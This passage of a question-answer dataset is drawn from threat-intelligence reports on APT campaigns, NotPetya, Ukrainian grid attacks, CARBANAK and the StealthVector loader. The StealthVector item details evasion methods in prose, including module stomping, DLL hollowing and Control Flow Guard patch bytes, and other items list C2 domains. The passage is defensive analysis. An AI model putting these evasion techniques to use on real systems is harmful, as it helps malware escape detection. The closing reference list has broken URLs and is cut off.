characteristics of the certificates support this conclusion?",
    "output": "Answer: The X.509 certificates extracted from the capture files were both self-signed for 'google.com', making the attack easily detectable even for non-technical users, as web browsers typically display warnings about untrusted sites. Additionally, the certificate was created for 'google.com' rather than '*.google.com'. This is a significant oversight by the attackers, as they were attempting to MITM traffic to 'www.google.com', not 'google.com'. The use of a self-signed certificate and the incorrect domain name in the certificate are clear indications of a MITM attack, as legitimate certificates issued by trusted certificate authorities would not exhibit these issues.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Norway, November 2011\nNorway had the most prolific series of cyber-attacks in the country's history in November 2011.8 As reported by Norway's National Security Agency (NSM), more than 10 firms were targeted by an advanced persistent threat using spear-fishing attacks, many of which were in the oil industry.9 The attacks may have been ongoing for over a year. The companies were unaware of the attacks until concerned employees reported receiving suspicious emails.\nNo specific information was released on the tools or malware that were used to conduct these attacks; however NSM noted that a virus was used in conjunction with tailored spear-fishing attacks making use of trojan attachments.10 It appeared that the purpose of the attacks was large-scale data exfiltration. As was the case in Night Dragon, the NSM bulletin suggests that the attacks varied slightly each time so as to avoid AV detection. An article by Defense News quotes NSM as stating that \"the attacks have, on several occasions, come when the companies have been involved in large-scale contract negotiations.\"11 This could suggest that the attackers were privy to the negotiations. Interestingly, in 2010 Norway's Statoil was engaged in negotiations with China Oilfield Services, Ltd. (COSL). According to the Wall Street Journal, COSL is the \"oil-field services and rig-construction unit of state-controlled China National Offshore Oil Corp., the country's\nlargest offshore oil and gas company by output.\"12\n8  BBC News. (2011, November 18). Hackers attack norway's oil, gas, and defence businesses. BBC News Technology. Retrieved from http://www.bbc.co.uk/news/technology-15790082\n9  France-Presse, A. (2011, November 18). Norwegian defense firms hacked, intel reports. Defense News. Retrieved from http://www.defensenews.com/article/20111118/DEFSECT04/111180309/Norwegian-Defense-Firms-Hacked-Intel-Reports\n10  NSM (2011) Samme akt\u00f8r bak flere datainnbrudd . Retrieved From https://www.nsm.stat.no/Aktuelt/ Nytt-fra-NSM/Samme-aktor-bak-flere-datainnbrudd/\n11  France-Presse, A. (2011, November 18). Norwegian defense firms hacked, intel reports. Defense News. Retrieved from http://www.defensenews.com/article/20111118/DEFSECT04/111180309/Norwegian-Defense-Firms-Hacked-Intel-Reports\nThe goal of the attacks appeared to be the collection of confidential information, such as user names, passwords, industrial drawings, and other proprietary documents.13 This would seem to be consistent with the types of information sought in both Night Dragon and APT1. The timeframe of the attack aligns with the event timeline listed in the APT1 report, and within the report there is an event appearing in Norway. This is then a convergence of time and objectives across these operations which complement the tactical similarities involving the use of social engineering, persistent backdoors, and large scale data exfiltration.\nSmall Headline: Telvent, September 2012\nIn September 2012 Canadian energy company Telvent was infiltrated. Telvent is responsible for supplying control programs and systems for over half of the oil and gas pipelines in North and Latin America.14 The attackers installed malware which they used to steal project files related to Telvent's OASyS SCADA product. According to security blogger Brian Krebbs, OASyS is \"a product that helps energy firms mesh older IT assets with more advanced 'smart grid' technologies.\" 15\nThe infiltration follows the same methodical approach exhibited in the Night Dragon and Norwegian intrusions. Not only was the malware difficult to detect, but it was planted using spear-phishing methods that targeted mid to high level executives16 17 .\nPerhaps the most convincing piece of evidence as to the origins of the attack is what appears to be a notification released by Telvent which identified malicious files and domains used for Command and Control (C2). The filenames \"fxsst.dll\" and \"ntshrui.dll\" which appear in the Telvent notification also appear in the APT1 report, along with the domains \"hugesoft.org\" and \"bigish.net\" which are noted as mainstays of APT1 by Mandiant. Several security firms at the time also reported the belief that the attack had been perpetrated by the \"comment group\" an alias in the Mandiant Report for APT1. In fact, Mandiant actually mentioned the Telvent attack in their report under a section entitled \"APT1 in the News.\"\nThe reason the Telvent attack is so important is that it represents the possibility for departure from simply data exfiltration. Although available information indicates that the goal of the attack was stealing software, the software could just have easily been modified and replaced. Attacking a prolific energy ICS company like Telvent means that a trojan could be planted in the software, being unintentionally distributed to Telvent's customers and offering the perpetrator an avenue for more insidious attacks.\n12  Simon Hall (2013, December 13). China, Norway Strike Oil Deal Despite Tensions. Wall Street Journal. Retrieved from http://online.wsj.com/article/SB10001424052748703727804576016841533225226.html\n13  Ibid.\n14  Vijayan, J. (2012, September 26). Energy giant confirms breach of customer project files. Computer-world. Retrieved from http://www.computerworld.com/s/article/9231748/Energy_giant_confirms_breach_of_ customer_project_files\n15  Krebs, B. (2012, September 26). Chinese hackers blamed for intrusion at energy industry giant telvent. Retrieved from http://krebsonsecurity.com/2012/09/chinese-hackers-blamed-for-intrusion-at-energy-industry-giant-telvent/#more-16936\n16  Vijayan, J. (2012, September 21). Cyber espionage campaign targets enery companies. Computerworld. Retrieved from http://www.computerworld.com/s/article/9231596/Cyber_espionage_campaign_targets_energy_ companies\n17  Ibid.\nSmall Headline: China\nPerhaps the most readily apparent attribution is to China as a state actor \u2013 the APT1 report makes a convincing argument for this which offers a lot of very well constructed circumstantial evidence. Night Dragon highlights the use of a RAT known as zwSheel which was used both as a to perform C2 and to create custom trojans. Interestingly, upon launch zwShell displays an error dialog with a hidden text field and the program will not function unless the password 'zw.china' is entered into this hidden text field. The ranges of consecutive IP addresses used were large enough that it is likely that the Chinese government had to be involved in some capacity.\nChina certainly possesses the motive to commit the attacks \u2013 according to the Washington Times, China is already surpassing the United States as the number one oil importer from the Middle East18 , and poised to become the number one oil importer globally.\nSmall Headline: Increasing Demand\nChinese demand for oil has grown dramatically as its economy continues to expand. Since the mid-1990s, China has been a net importer of oil.19 The continuous growth of the Chinese economy has resulted in vast increases in the need for fuel and petro products. China has doubled its oil consumption in the last 10 years and become the second largest consumer of oil in the world behind the U.S.20 Like the U.S., China is now dependent on its oil imports to feed its thriving economy. It is estimated that China's import dependency could rise to over 50% by 2020.1\nChina's oil refineries are not capable of handling the current demand the economy is placing on them. There is evidence that the refineries used for fuel are at a competitive disadvantage when compared to other countries. To complicate matters, many Chinese oil refineries are also oriented to the making of diesel and not gasoline, which is in increasing demand1.\nThis means China is in great need of more sources of oil and more efficient refineries. The development of improved refining and mining equipment takes years and can cost millions of dollars. Exploration costs for finding new oil reserves have almost tripled in the past decade.21 They could save billions of dollars and shave years of research off by acquiring technology from petrochemical corporations that are already heavily invested in this continuing process. It also means that China would be able to compete in the global market place much sooner and more competitively than if they waited to develop the technology on their own. This establishes that there are significant reasons for China to act on behalf of its own oil industry and use its state resources to conduct cyber-attacks against corporate entities worldwide.\n18  Hill, P. (March 14, 2013). China poised to top U.S. as oil buyer; increased car sales spur jump. Retrieved from http://www.washingtontimes.com/news/2013/mar/14/china-poised-to-top-us-as-top-oil-buyer/?page=all\n19  Skeer, J. (2007). China on the move: Oil price explosion?. Energy policy, 35(1), 678-691. http://discover.lib.purdue.edu:3210/purdue?ctx_ver=Z39.88-2004&ctx_enc=info%3Aofi%2Fenc%3AUTF-8&ctx_tim=2013-03-09T15%3A59%3A35IST&url_ver=Z39.88-2004&url_ctx_fmt=infofi%2Ffmt%3Akev%3Amtx%3Actx&rfr_id=info%3Asid%2Fprimo. exlibrisgroup.com%3Aprimo3-Article-wos&rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3A&rft.genre=article&rft. atitle=China%20on%20the%20\n20  Index Mundi, (2012). Country comparison > Oil \u2013 consumption > Top 10. Retrieved from http://www. indexmundi.com/g/r.aspx?v=91&t=10\n21  Johnson, C., (2010). Oil exploration costs rocket as risks rise. Retrieved from http://www.reuters.com/ article/2010/02/11/us-oil-exploration-risk-analysis-idUSTRE61A28X20100211\nChina's Oil Production\nQuestion: What was the significance of the Telvent attack in September 2012, and how does it relate to the tactics used in the Night Dragon and Norwegian intrusions?",
    "output": "Answer: The Telvent attack in September 2012 was significant because it targeted a company responsible for supplying control programs and systems for over half of the oil and gas pipelines in North and Latin America. The attackers installed malware to steal project files related to Telvent's OASyS SCADA product, which helps energy firms integrate older IT assets with modern smart grid technologies. The attack followed a methodical approach similar to the Night Dragon and Norwegian intrusions, using spear-phishing methods to target mid to high-level executives and employing hard-to-detect malware. The attack is notable because it suggests a potential shift from simple data exfiltration to more insidious attacks, such as modifying and replacing software to plant trojans.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: ON JUNE 27TH , THE UKRAINIAN RADIO HOLOS STOLYTSY WERE ABLE TO CONTINUE THE RADIO DIFFUSION USING AN ANALOG RADIO EMETOR: THEIR MAIN SERVER WAS INFECTED BY A MALWARE... NOTPETYA WAS BORN\u2026\nStill in 2017, another massive attack has been performed against ukrainian critical infrastructure. Although the payload did not include exploits targeting industrial systems, it did significantly impact manufacturing plants, as well in Ukraine as world-wide, with 6-figure losses at several european corporations.\nWhat happened: on June 27th, the main server of the Ukrainian radio Holos Stolytsy was infected by a malware. The radio was only able to continue the diffusion using an analog radio emetor. This was \"NotPetya\"'s first strike! Soon after this first detection, other infections were quickly detected around the world. But NotPetya is not Petya: let's not mix the original 2016 Petya ransomware and the one we are talking about, which is not a ransomware, and therefore was named \"NotPetya\".\nBasically, a ransomware is a malware that prevents file usage (e.g. using encryption) and requests a ransom to decrypt them. Petya is a ransomware published in March 2016. The one which started in June 27th is quite different although based on the ransomware Petya. The main difference is the fact that it is not a ransomware. Once NotPetya is executed on a platform, it encrypts the whole hard drive but does not exfiltrate or embed a method to decrypt stored data. It means that NotPetya's authors were not interested in money.\nNotPetya embeds an effective infection method using the same exploits that Wannacry uses, targetting Windows SMB. Unlike Wannacry, NotPetya tries to exploit remote machines located on the same local network. But the main point is NotPetya has functionalities to retrieve and exfiltrate passwords and some remote administration functionalities.\nWe can directly conclude that NotPetya was not designed to make money or to control a BotNet but instead to infect a precise target. The initial infection vector came from a malicious update of the Ukrainian countability software M.E.Doc. Indeed, hackers took the control of a M.E.Doc's server update and infected an update with NotPetya.\nThis Ukrainian radio was not an isolated case. In fact, lots of Ukrainian institutions and companies have also been infected and, since NotPetya continued to spread itself through SMB, the infection rate was quite high. Several French companies, like Saint Gobain, have also been infected. As for previous attacks using the same vulnerability (Wannacry for instance), industrial systems were impacted, because of either direct network connections between IT and OT domains, or laptops or other equipments connected to both domains.\nDetermining the goal or attributing the malware to a country is quite hard. Russian Rosneft also has been impacted. The Ukrainian Cyber Police officially confirmed that M.E.Doc servers were backdoored on three different occasions. The total losses, due to the alleged negligence of Intellect-Service, might be in the range of $1bn considering that St Gobain alone has declared a loss of $250M in revenue.\nBig Headline: 2015 INCIDENT\nUkraine's state security service SBU has blamed Russia but the nation's energy ministry said it would hold off on attribution until after it finishes a formal probe.\nA press statement on the SBU website alleged the discovery of malicious software responsible for these outages on the networks of regional power companies. According to the SBU press statement, the cyberattack was accompanied by a barrage of phone calls to their technical support telephone numbers which would have acted like a denial of service (DoS) attack.\nThe U.S. cyber intelligence firm iSight Partners said it has determined that a Russian hacking group known as Sandworm caused this unprecedented power outage in Ukraine. Many other US based companies are pointing to Sandworm as the \"hacking\" unit.\nSome press organizations are claiming this is the first known Grid hack. They should remember, even unconfirmed, that the 2003 blackout in the US east coast\nmay have been caused by a cyberattack. Also, the FBI has already claimed that Daesh has tried unsuccessfully to hack the national US power grid.\nAccording to the SANS ICS blog, the attack was a coordinated effort which targeted several power sub-companies and included a flooding attack on their phone support systems to prevent legitimate customers from reporting a power cut which would alert the on-call personnel to the problem. According to the same source (unconfirmed), the staff in the affected companies acted quickly to bypass the SCADA systems and run everything in manual mode by acting on the main breakers which restored service in under 6 hours.This would not have been possible in a modern grid installation which relies heavily on automation and can't be run in \"manual mode\".\nA Ukrainian telecoms engineer has raised doubts about the widely reported link between BlackEnergy attacks and power outages in his country. Named Illia Illin, per \"The Register\" article, he claims \"First\nof all, there weren't any blackouts in Boryspil (KBP)\".\nAn investigation team led by US government officials has released a report as part of the ICS-CERT initiative (see sources section). This report remains vague about the exact insertion methods and attacker techniques and focuses on proactive defenses that would have prevented the attack. Also, in the current political context, it's hard to imagine that interviews of Ukrainian operators by US government officials would be 100% factual and accurate.\nSANS ICS has released a new detailed report which summarizes the information collected by the investigation team (see sources for \"DUC5\"). The report uses the Cyber Kill Chain framework to characterize the different phases of the attack. However, many technical details remain vague (especially concerning attacker reconnaissance and remote control by VPN). An analysis of the alleged malware used is provided. The RAT tool used by the attacker is not mentioned.\nBig Headline: 2016 INCIDENT\nSeveral assumptions have been released since this second outage. For the time being, technical details regarding the attack have not been published. The only \"technical\" finding is the threat vector. Indeed, the SCADA stations had been compromised by an external source. Marina Krotofil, lead cyber-security researcher at Honeywell who assisted in the investigation, declared \"It was an intentional cyber incident not meant to be on a large scale... they actually attacked more but couldn't achieve all their goals\". Also from Marina Krotofil, \"hackers are thought to have hidden in Ukrenergo's IT network undetected for six months, acquiring privileges to access systems and figure out their workings, before taking methodical steps to take the power\noffline\". So far, we have no information confirming that the techniques used are the same or not.\nAccording to CyberX, the malware used during the BugDrop operation detailed in the facts section could have been used during the reconnaissance phase. Indeed, the compilation date and some targets may lead to this conclusion. The malware was compiled several times between June 2016 and end of October 2016. Concerning identified targets here is the list:\nA company that designs remote monitoring systems for oil & gas pipeline infrastructures.\nAn international organization that\nmonitors human rights, counter-terrorism and cyberattacks on critical infrastructure in the Ukraine.\nAn engineering company that designs electrical substations, gas distribution pipelines, and water supply plants.\nA scientific research institute.\nEditors of Ukrainian newspapers.\nThe assumption linking this malware and the attack is based on these targets mainly located in Ukraine and linked to energy but also due to techniques used like the reflective DLL injection (loading malicious code without calling the normal Windows API calls) which was used during the first attack. Another hint comes from the compilation time.\n\nQ: How did the NotPetya malware differ from typical ransomware, and what were its primary objectives?",
    "output": "A: NotPetya differed from typical ransomware in that it encrypted the entire hard drive but did not provide a method to decrypt the data, indicating that its authors were not interested in financial gain. Instead, NotPetya was designed to infect specific targets. Its primary objectives included retrieving and exfiltrating passwords and providing remote administration functionalities, suggesting it was intended for espionage or disruption rather than extortion.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the analysts analyze the eToken.exe file to understand its behavior and origin, and what tools and techniques were used in this process?",
    "output": "The analysts performed static code analysis on eToken.exe (VVSup.exe) to understand its behavior and origin. They used tools like IDA Pro with plugins such as Simabus's ClassInformer, Matrosov's HexRaysCodeXplorer, and MFC_Helper. They analyzed the file's PE header, checked its linkage with libraries like MFC42.dll and dbghelp.dll, and examined its resource section to determine it was a Dialog application created by MFC Wizard of Visual Studio 6. The analysis involved defining classes, recreating the code, and understanding the relationship between MFC classes to identify the malware's functionality.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the analysis of MITRE ATT&CK techniques for UNC2452 reveal challenges in attribution, and what specific issues were encountered?",
    "output": "The analysis of MITRE ATT&CK techniques for UNC2452 revealed several challenges in attribution. First, there were significant differences in documented ATT&CK techniques between vendors analyzing the same actor group and/or malware. For example, FireEye listed seven techniques and ten sub-techniques, while Microsoft showed four techniques and six sub-techniques for the same actor. Second, several techniques for APT29 and APT41 were missing from the ATT&CK groups cataloged by MITRE, leaning towards more recent attacks. Third, there were instances where ATT&CK lacked the nuanced matching techniques described by security reporting. For instance, the technique T1078 Valid Accounts was automatically assigned to multiple tactics, while Microsoft limited its applicability to the Persistence tactic. Additionally, some techniques gained meaning through repeated applications and choices of what to encode, such as the use of a salted FNV-1a hashing algorithm for encoding blacklisted domains and processes.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "The CARBANAK actors are financially motivated, advanced actors that have historically targeted financial and hospitality laterals, with a recent move into targeting restaurants.6 This threat actor group has shown themselves to be proficient and careful in their toolset utilization, consistently removing evidence of any actions-on-objective as they proceed through an environment. They have been observed utilizing various malware, methods and communications, with tools and techniques often differing greatly between targets. While this group has shown technical ingenuity in techniques such as point-of-sale implants,7 Google services command-and-control communications8 and persistence via application shim databases9,  they have also shown a propensity for using freely available or open source\ntoolsets for much of their lateral activities. Whatever the methods used, CARBANAK has shown themselves to be highly persistent and determined actors, able to rapidly compromise and traverse various environments while quickly adapting to internal security controls.\n6 Mesa, Huss; \"FIN7/CARBANAK Threat Actor Unleashes Bateleur Jscript Backdoor\";\n7 KYaneza; \"Signed PoS Malware Used in Pre-Holiday Attacks, Linked to Targeted Attacks\";\n8 Griffin; \"CARBANAK Group Uses Google for Malware Command-and-Control\";\n9 Erikson, McWhirt, Palombo; \"To SDB, or Not to SDB: FIN7 Leveraging Shim Databases for Persistence\";\nThis white paper covers a sampling of observed indicators derived and utilized during this engagement. Included are the details regarding the observed intrusion vector, entrenchment techniques, actions-on-objective, lateral movement tools and methods, unique malicious files, and behavioral indicators utilized in the identification, tracking and response of this actor group. Included with the publication of this report is a Digital Appendix, containing content for RSA NetWitness Logs and Packets and RSA NetWitness Endpoint used to identify and track attacker activity throughout the environment during this incident. All content should be tested before full integration into RSA NetWitness Endpoint, RSA NetWitness Logs and Packets or third-party tools to prevent any adverse effects from unknown environmental variables. More information on the associated Digital Appendix is found in Section 7.\nDisclaimer: This white paper and related graphics are provided for informational and/or educational purposes. The information contained in this document is intended only as general guidance and is not legal advice. Although the greatest care has been taken in the preparation and compilation of this white paper, RSA, its servants and/or agents will accept no liability or responsibility of any kind. This white paper is not intended to be a substitute for legal or other professional advice, and constitutes the opinions of the author(s). All information gathered is believed correct as of October 2017. Corrections should be sent to RSA for future editions. Redistribution or reproduction of this document is prohibited without written permission of RSA.\nRead the text above and answer this question: How does the CARBANAK threat actor group demonstrate their proficiency and carefulness in their toolset utilization? What specific techniques have they employed that showcase their technical ingenuity?",
    "output": "The CARBANAK threat actor group demonstrates their proficiency and carefulness in their toolset utilization by consistently removing evidence of any actions-on-objective as they proceed through an environment. Specific techniques that showcase their technical ingenuity include the use of point-of-sale implants, Google services command-and-control communications, and persistence via application shim databases. Despite their advanced techniques, they also frequently use freely available or open source toolsets for much of their lateral activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: StealthVector\nIn October 2020, we discovered StealthVector, an evasive shellcode loader written in C/C++. This malware implements various evasion techniques and is still actively being developed. We have observed that its payload is either the Cobalt Strike beacon or the malware ScrambleCross. (The Japanese security service company LAC previously published a blog post discussing the Cobalt Strike beacon.12)\nStealthVector is designed to execute the second stage of the payload in stealth mode. This means that its evasive techniques can be enabled and disabled by its embedded configuration. Because of this, malicious actors can easily customize this loader for their targets. The configuration of StealthVector (Figure 19) is embedded in its data section with ChaCha20 encryption, which is decrypted upon initialization (Figure 20). This ChaCha20 routine notably uses a fixed custom value of 0x13 for the initial counter (Figure 21).\nAccording to RFC7539, the Internet Engineering Task Force (IETF) specification for the ChaCha20 stream cipher and the Poly1305 authenticator,13 the ChaCha20 algorithm uses a 32-bit initial counter. This counter can be any number but is usually 0 or 1. As far as we have observed, StealthVector always uses 0x13 for its initial counter, which is an uncommon practice. This makes it difficult to decrypt the malware's configuration using common methods such as the Python library pycryptodome, which does not support custom initial counters.\nThe decrypted configuration data is copied onto a newly allocated buffer, which determines its behavior. There are two types of configurations found in the wild. One is for a local shellcode runner, which has a size of 0x38. This type of configuration has fields for checksum, flags for context awareness, flags for evasive features, and information for the payload (Figure 22 and Figure 23).\nThe other is for a remote shellcode injector, which has a size of 0x44. This type of configuration has fields for checksum, flags for context awareness, flags for evasive features, information for injection, and information for the payload (Figure 24 and Figure 25).\nVery Small Headline: Logic to Determine Payload Location\nStealthVector decrypts and executes its payload in memory, but it can also be configured to load its encrypted payload in a specific location. Some variants embed the payload in its binary, while others load it to another file in the same directory, whose file name is specified in the malware's configuration (Figure 28). The decryption logic is the same for all variants of StealthVector: It reads the specific size of data from a specific offset. The values for the offset and the size of the encrypted payload are already defined in the malware's configuration. Afterward, the payload will be decrypted by ChaCha20. This same routine is used in decrypting StealthVector's configuration, but the nonce for its payload is already defined in the configuration (Figure 29).\nVery Small Headline: Module Stomping in Local Process\nSome variants of StealthVector implement an evasive technique called module stomping, which is designed to bypass the detection of reflective loading. Module stomping is well known because Cobalt Strike has implemented this feature in its version 3.11.14 In the case of StealthVector, however, the injected payload is a shellcode instead of a dynamic link library (DLL). To perform this technique, StealthVector looks for a legitimate DLL that has sufficient space for its payload, \"(payload_size + 2048)\", as shown in Figure 32.\nOnce it finds one that meets its space requirement, StealthVector loads that DLL using the LoadLibraryExW function, with the flag DONT_RESOLVE_DLL_REFERENCES. As shown in Figure 33, when this flag is enabled, the system does not call the DllMain of the target DLL upon loading.\nOnce it loads the target DLL, StealthVector changes the protection settings of the DLL using read, write, and execute (RWX) permissions. It then copies its payload onto the legitimate DLL and executes the payload through the CreateThread function, as illustrated in Figure 34.\nVery Small Headline: Bypassing Control Flow Guard\nAs shown in Figure 35, some variants of StealthVector run their shellcode by bypassing Microsoft's Control Flow Guard (CFG), an exploit mitigation technology. CFG makes it difficult for malware to run code on Windows operating systems by restricting indirect calls to an unapproved address. In this case, StealthVector executes its shellcode using CreateThread, which checks the target address.\nIn order to sidestep attempts to verify its indirect call, StealthVector will then patch the LdrpHandleInvalidUserCallTarget API in ntdll.dll with \"48 FF E0 CC 90 (jmp rax; int3; nop)\",  as shown in Figure 36. LdrpHandleInvalidUserCallTarget is called when CFG, through the LdrpValidateUserCallTarget function, determines that the target address is invalid. StealthVector can patch this API without crashing the application.\nVery Small Headline: Phantom DLL Hollowing in Remote Process\nSome variants of StealthVector can also inject their shellcode payload into a remote process using phantom DLL hollowing, a technique that is a combination of process hollowing and module stomping (Figure 37). To do this, StealthVector spawns a new process, which is specified in its configuration, in suspended mode. StealthVector uses the NtCreateSection and ZwMapViewOfSection APIs to load a legitimate DLL into this newly created process. The logic of finding its target DLL is the same as that in module stomping: It checks if the code section, or (.text section size), is large enough. Afterward, it overwrites the code section of the loaded DLL with its own payload and executes it in the DLL's memory space. It then patches the entry point of the legitimate process in order to modify the shellcode's execution flow to this entry point in the DLL. Using this method, malicious actors can hide StealthVector's payload within the memory space of an image, which often goes unnoticed by common memory scan engines, and execute it like a normal module.\nMedium Headline: Cobalt Strike Beacon\nAmong most of the samples we have come across, there are two types of Cobalt Strike beacons: a hybrid HTTP DNS (Domain Name System) and HTTPS. Interestingly, all the Cobalt Strike beacons in memory are in a Portable Executable (PE) file format with a characteristic header, as shown in Figure 38. While it appears as a valid MZ header, it can also be executed as machine code.\nThis assembly, much like a PE header, calculates the address of a specific function, which serves as the entry point for the reflective loader to dynamically initialize and execute a DLL. It should also be noted that some of the samples have PE files with broken headers, although they still operate in the same way (Figure 39).\nThe Cobalt Strike beacons in the samples we have uncovered bear similarities to those used in attacks carried out by the Chimera APT group, as reported by Cycraft.15 However, it remains uncertain whether this campaign can definitively be linked to Chimera, as many similar Cobalt Strike beacons and Meterpreter shellcodes can also be found on VirusTotal (Figure 40).\nThe Cobalt Strike beacon found in the StealthMutant and StealthVector samples has two types of watermarks. One is \"305419896\", which is that of a cracked version, and is widely used by a variety of other malicious actors, according to research conducted by VMware Carbon Black.16 The other watermark is \"426352781\", which has been in use since at least May 2021 but has never been attributed to malicious actors before.\n\nBased on the above text, answer a question. How does StealthVector, the shellcode loader associated with Earth Baku, achieve stealth mode execution, and what are the implications of its evasive techniques?",
    "output": "StealthVector achieves stealth mode execution by implementing various evasion techniques that can be enabled or disabled via its embedded configuration. This allows malicious actors to customize the loader for specific targets. The configuration is embedded in the data section with ChaCha20 encryption, which is decrypted upon initialization. The use of an uncommon initial counter value (0x13) for the ChaCha20 algorithm makes it difficult to decrypt the malware's configuration using common methods. This level of customization and obfuscation makes StealthVector highly evasive and challenging to detect using standard security measures.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: References\nAdams, Eric. 2004. Rods From God. Retrieved on March 10, 2008, from sci.com/scitech/article/2004-06/rods-god.\nAlberts, David S. 2002. Information Age Transformation. Retrieved on February 22, 2008, from f.\nAlberts, David S., Garstka, John J., Stein, Frederick P. 2000. Network Centric Warfare. Retrieved on February 2, 2008, from f.\nAllen, Kenneth. 2005. Reforms in the PLA Air Force. Retrieved on February 12, 2008, from article_id=2369972.\nAllen, Kenneth W., Glenn Krumel, Jonathan D. Pollack. 1995. China's Air Force Enters the 21st Century. Retrieved 1 February 2008, from .\nAlmeida, Marcelo. 2006. Cyberwar: The Beginning. Retrieved on March 3, 2008, from Itemid=30&msgid=710.\nAnnual Report to Congress: Military Power of the People's Republic of China 2008. 2008. Retrieved on March 15, 2008, from 2008/2008-prc-military-power.htm.\n-\nAnnual Report to Congress: Military Power of the People's Republic of China 2007. 2007. Retrieved on February 18, 2008, from http://www.defenselink.mil/pubs/pdfs/070523China-Military-Power-final.pdf.\nA Cyber-Riot. 2007. Retrieved on February 2, 2008, from world/europe/displaystory.cfm?story_id=9163598.\nAmnesty International. 2004. People's Republic of China Controls tighten as Internet activism grows. Retrieved on August 1, 2008, from asset/ASA17/001/2004/en/dom-ASA170012004en.html.\nAppel, Edward. 2004. China's Espionage: What's At Stake. Retrieved on March 20, 2008, from .\nArmoured Fighting Vehicles. 2008. Retrieved on April, 10, 2008, from p.\nArrests Following Jakarta Fuel Price Increases. 2008. Retrieved on August 1, 2008, from .\nBaard, Mark. 2007. Sentient World: War Games on the Grandest Scale. Retrieved on March 20, 2008, from .\nBanerjee, Manik and Zappei, Julia. 2008. Fuel Price Hikes Spark Protests In India And Malaysia That Could Undermine Governments. Retrieved on August 1, 2008, from - that-could-undermine-governments/550071/index.html.\nBarker, Garry. 2002. Cyber terrorism a mouse-click away. Retrieved on February 24, 2008, from .\nBasu, Indrajit. 2008. India Faces Cyber Challenge From China. Retrieved on June 10, 2008, from challenge_from_china/5587/.\nBeam It Right There Scotty. 2005. Retrieved on January 26, 2008, from .\nBerkeley Bionics Human Exoskeleton. 2007. Retrieved On March 10, 2008, from .\nBlock, Ryan. 2006. The Brain Port, Neural Tongue Interface Of The Future. Retrieved on March 10, 2008, from interface-of-the-future/.\nBloom, James. 2008. Robots ready to support soldiers on the battlefield. Retrieved on June 26, 2008, from technology.\nBonsor, Kevin. 2008. How Augmented Reality Will Work. Retrieved on March 10, 2008, from .\nBoyd, Clark. 2008. Profile: Gary McKinnon. Retrieved on August 4, 2008, from .\nBradsher, Keith. 2006. Hong Kong enlists youth to fight piracy. Retrieved on July 20, 2008, from .\nBraukus, Michael. 2004. NASA Develops System To Computerize Silent Subvocal Speech. Retrieved on March 2008, from subvocal_speech.html.\nBrenner, Bill. 2007. Experts doubt Russian government launched DDoS attacks. Retrieved on February 18, 2008, from , sid14_gci1255548,00.html.\nBingemann, Mitchell. 2008. Buggy Software Sends Optus Offline. Retrieved on August 8, 2008, from .\nBrenner, Bill. 2005. Myfip's Titan Rain Connection. Retrieved on January 8, 2008, from .\nBridis, Ted. 2008. CIA: Hackers demanding cash disrupted power. Retrieved on February 2, 2008, from .\nBright, Arthur. 2007. Estonia Accuses Russia Of Cyberattack. Retrieved on March 10, 2008, from .\nBrookes, Peter. 2006. China's Influence In Africa. Retrieved on March 15, 2008, from .\nBruno, Greg. 2008. The Evolution of Cyber Warfare. Retrieved on March 12, 2008, from .\nBurns, Simon. 2006. MySpace and Wikipedia Clones Storm China. Retrieved on July 31, 2008, from .\nCenter for Strategic and International Studies. 2003. China's Space Program. Retrieved on April 3, 2008, from .\nChina and Internet Censorship. 2006. Retrieved on August 5, 2008, from . com/interactive/world/0603/explainer.china.internet/frameset.exclude.html.\nChina defends internet regulation. 2006. Retrieved on July 15, 2008, from . co.uk/2/hi/asia-pacific/4715044.stm.\nChina hires Net squad to sway opinion. 2005. Retrieved on July 15, 2008, from .\nChina internet use grows. 2006. Retrieved on August 1, 2008, from\n2/hi/business/2145865.stm.\nChina Tightens Vice On Internet. 2006. Retrieved on June 11, 2008, from . cn/china-vise.htm.\nChina's National Defense in 2006 (White Paper). 2006. Retrieved on March 3, 2006, from l.\nChina's Navy 2007. 2007. US Office of Naval Intelligence. Retrieved January 10, 2008, from .\nChina's Proliferation Practices, and the Development of Its Cyber and Space Warfare Capabilities. 2008. Retrieved on June 30, 2008, from hearings/transcripts/08_05_20_trans/08_05_20_trans.pdf.\nChina's Space Program Aims at Peaceful Use of Space Resources. 2005. Chinanews.cn, 15 October. Retrieved on July 10, 2006, from\nChinese Submarines. 2008. Retrieved on April 10, 2008, from / navy/sub/default.asp.\nChristensen, John. 1999. Bracing For Guerrilla Warfare In Cyberspace. Retrieved on February 2, 2008, from .\nCode Red Worm Spreading, Set To Flood Whitehouse. 2001. Retrieved on July 18, 2008, from .\nCost of Code Red Rising. 2001. Retrieved on February 2, 2008, from .\nColeman, Kevin. 2008. Cyber War 2.0 \u2013 Russia V. Georgia. Retrieved on August 13, 2008, from .\nCommissar of Nashi says he waged cyber attack on Estonian government sites. 2007. Retrieved on March 10, 2008, from x. php?lng=en&page_id=60&news_id=888.\nCook, John. 2008. Cult Friction. Retrieved on July 14, 2008, from . com/from-the-magazine/2008/03/scientology_anonymous_protests_tom_cruise_01.php.\nCooper, Simon. 2006. How China Steals US Military Secrets. Retrieved on April 2, 2008, from .\nCordesman, Anthony, and Kleiber, Martin. 2006. Overview of Major Asians Powers. Retrieved on March 12, 2008, from / 060626_asia_balance_powers.pdf.\nCorpus, Victor N. 2006. Americas Acupuncture Points, Part 1. Retrieved on March 18, 2008, from .\nCorpus, Victor N. 2006. Americas Acupuncture Points, Part 2. Retrieved on March 18, 2008, from .\nCowell, Alan. 2008. French Truckers Protest Fuel Prices. Retrieved on August 1, 2008, from .\nCox Report. 1999. Retrieved on June 12, 2008, from / congress/1999_r/cox/ch1bod.htm.\nCuban, Brian. 2008. Confessions of a Banned Digger. Retrieved on September 5, 2008, from /.\nCyberwarfare in International Law. 2008. Retrieved on March 8, 2008, from .\nDavidson, Keay. 2004. Air Force Pursuing Antimatter Weapons. Retrieved on March 10, 2008, from 3 